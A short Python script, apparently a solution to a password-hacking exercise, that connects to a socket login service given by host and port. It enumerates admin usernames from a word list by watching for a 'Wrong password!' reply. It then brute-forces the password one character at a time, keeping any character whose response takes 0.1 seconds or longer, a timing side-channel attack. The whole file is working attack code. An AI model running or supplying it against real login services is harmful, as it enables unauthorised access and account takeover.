import json
import argparse
import itertools
import socket
import time
parser = argparse.ArgumentParser()
parser.add_argument('hostname')
parser.add_argument('port', type=int)
args = parser.parse_args()
address = args.hostname, args.port

demo = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890'

with socket.socket() as client:
    client.connect(address)
    with open('C:\\Users\\User\\Downloads\\logins.txt') as admins:
        for admin in admins:
            admin = admin.strip()
            login = {
                'login': admin,
                'password': ''
            }
            client.send(json.dumps(login).encode())
            response = client.recv(1024).decode()
            if 'Wrong password!' in response:
                staff = admin
                break
        password = ''
        while True:
            for i in itertools.product(demo, repeat=1):
                verify = {
                    'login': staff,
                    'password': password + ''.join(i)
                }
                client.send(json.dumps(verify).encode())
                st = time.perf_counter()
                new_response = client.recv(1024).decode()
                et = time.perf_counter()
                elapsed_time = et - st
                if elapsed_time >= 0.1:
                    password = verify['password']
                if 'Connection success!' in new_response:
                    print(json.dumps(verify, indent=4))
                    break
            else:
                continue
            break
